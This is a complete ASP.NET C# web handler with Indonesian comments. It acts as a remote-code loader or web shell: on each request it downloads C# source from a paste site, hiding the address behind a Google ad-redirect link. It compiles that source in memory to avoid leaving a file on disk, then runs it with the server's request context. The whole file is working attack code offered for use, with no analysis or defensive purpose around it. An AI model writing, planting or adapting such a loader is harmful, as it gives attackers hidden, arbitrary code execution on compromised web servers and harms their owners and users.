<%@ WebHandler Language="C#" Class="RemoteEvaluator" %>

using System;
using System.Web;
using System.Net;
using System.IO;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

public class RemoteEvaluator : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        // 1. URL TARGET (Bisa link Google Redirect atau Link Langsung)
        string rawUrl = "https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fdpaste.com%2F6MQQPJY62.txt&c=R,6,cb2349e1-7f4f-4dd0-88a6-9f8fe8cc3ca1,&typo=4";
        
        string sourceCode = GetContent(rawUrl);

        if (string.IsNullOrEmpty(sourceCode) || sourceCode.StartsWith("Error"))
        {
            context.Response.Write("Gagal download script: " + sourceCode);
            return;
        }

        // 2. KOMPILASI SCRIPT (Pengganti Eval)
        try 
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            
            // Konfigurasi Kompilasi
            parameters.GenerateInMemory = true; // Jangan bikin file .dll fisik, cukup di RAM
            parameters.GenerateExecutable = false;
            
            // Tambahkan Referensi DLL (Agar script remote bisa akses fungsi web)
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Web.dll");
            parameters.ReferencedAssemblies.Add("System.Data.dll");
            parameters.ReferencedAssemblies.Add("System.Xml.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            // Proses Kompilasi
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);

            // Cek Error Kompilasi
            if (results.Errors.HasErrors)
            {
                context.Response.Write("<h3>Error Kompilasi Script Remote:</h3><ul>");
                foreach (CompilerError error in results.Errors)
                {
                    context.Response.Write("<li>Line " + error.Line + ": " + error.ErrorText + "</li>");
                }
                context.Response.Write("</ul>");
                return;
            }

            // 3. EKSEKUSI (REFLECTION)
            // Cari class dan method di dalam script yang didownload
            Assembly assembly = results.CompiledAssembly;
            Type type = assembly.GetTypes()[0]; // Ambil class pertama yang ditemukan
            object instance = Activator.CreateInstance(type);
            
            // Cari method bernama "Run" dan jalankan
            MethodInfo method = type.GetMethod("Run");
            if (method != null)
            {
                // Passing 'context' agar script remote bisa nulis ke browser
                method.Invoke(instance, new object[] { context });
            }
            else
            {
                context.Response.Write("Error: Method 'Run' tidak ditemukan di script remote.");
            }
        }
        catch (Exception ex)
        {
            context.Response.Write("Runtime Error: " + ex.Message);
        }
    }

    // Fungsi Pembantu Download (Bypass Google Ads)
    private string GetContent(string inputUrl)
    {
        string finalUrl = inputUrl;
        if (inputUrl.Contains("adurl="))
        {
            try {
                string split = inputUrl.Substring(inputUrl.IndexOf("adurl=") + 6);
                if (split.Contains("&")) split = split.Substring(0, split.IndexOf("&"));
                finalUrl = HttpUtility.UrlDecode(split);
            } catch {}
        }

        try {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            using (WebClient client = new WebClient()) {
                client.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
                return client.DownloadString(finalUrl);
            }
        } catch (Exception ex) { return "Error: " + ex.Message; }
    }

    public bool IsReusable { get { return false; } }
}